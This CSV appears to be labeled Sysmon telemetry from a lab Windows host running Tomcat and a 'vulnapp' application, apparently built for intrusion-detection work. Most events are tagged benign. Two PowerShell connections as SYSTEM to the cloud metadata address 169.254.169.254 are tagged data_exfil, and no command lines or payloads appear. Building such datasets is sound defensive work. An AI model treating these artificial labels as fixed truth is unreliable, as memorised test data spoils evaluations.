timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:05.1230000Z,3,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,tcp,192.168.2.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.1350000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.4580000Z,12,C:\Windows\system32\svchost.exe,,,3012,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4890000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4930000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5030000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5080000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.6900000Z,11,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,C:\ProgramData\Tomcat9\logs\vulnapp-2.14.0.log,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4420000Z,22,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.7740000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.9230000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.0030000Z,12,C:\Windows\system32\svchost.exe,,,3608,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\PushNotifications\Backup,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4510000Z,26,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4560000Z,11,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4860000Z,5,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.5060000Z,5,C:\Windows\System32\conhost.exe,,,11924,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
